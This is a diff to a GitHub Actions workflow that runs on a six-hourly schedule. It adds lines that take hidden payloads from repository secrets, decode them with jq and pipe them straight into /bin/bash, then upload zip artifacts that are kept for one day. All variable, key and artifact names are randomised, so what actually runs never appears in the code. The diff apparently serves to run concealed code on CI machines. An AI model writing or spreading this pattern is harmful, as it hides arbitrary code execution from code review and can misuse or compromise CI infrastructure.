@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '36 0,6,12,18 * * *'
+    - cron: '12 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,16 +24,19 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          oyqpd06482: ${{ secrets.oyqpd06482 }}
+          jlfk314: ${{ secrets.jlfk314 }}
         run: |
-          printf '%s' "$oyqpd06482" | jq -r .bo5 | /bin/bash
-          printf '%s' "$kmshu3" | jq -r .f8 | /bin/bash
-          echo $w3 | jq -r .kruel2 | /bin/bash
+          printf '%s' "$jlfk314" | jq -r .eyyie2 | /bin/bash
+          echo $eg8386 | jq -r .j87 | /bin/bash
+          echo $jjlz66639 | jq -r .yxyyn6 | /bin/bash
+          echo $tez57 | jq -r .s24432 | /bin/bash
+          printf '%s' "$rsg10" | jq -r .lr8 | /bin/bash
+          printf '%s' "$qcoj14" | jq -r .pkw67833 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 67s7q9po
+          name: 5HVnOLSB
           path: "*.zip"
           retention-days: 1
